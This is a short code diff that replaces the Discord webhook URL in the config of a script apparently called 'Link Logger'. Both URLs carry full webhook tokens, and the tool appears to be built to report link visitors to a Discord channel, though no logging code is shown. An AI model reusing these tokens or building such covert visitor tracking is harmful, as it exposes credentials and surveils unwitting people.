@@ -8,7 +8,7 @@ __version__ = "v2.0"
 __author__ = ""
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1360741270804365352/c8BRSpDn16HrjtJVTKuHuartuGVlvadouHi5DSMGbxKOQ7rmTP2X-fwrfTpgrLrRh6-F",
+    "webhook": "https://discord.com/api/webhooks/1360747033748574339/7sGUnUYckbPs2ww9RM5zwlMTnZtnAzrhWvmzIG-yebzeeqBe2dugtPzmM2Ji7fWtlAio",
     "username": "Link Logger",
     "color": 0x000000,  # Black color
     
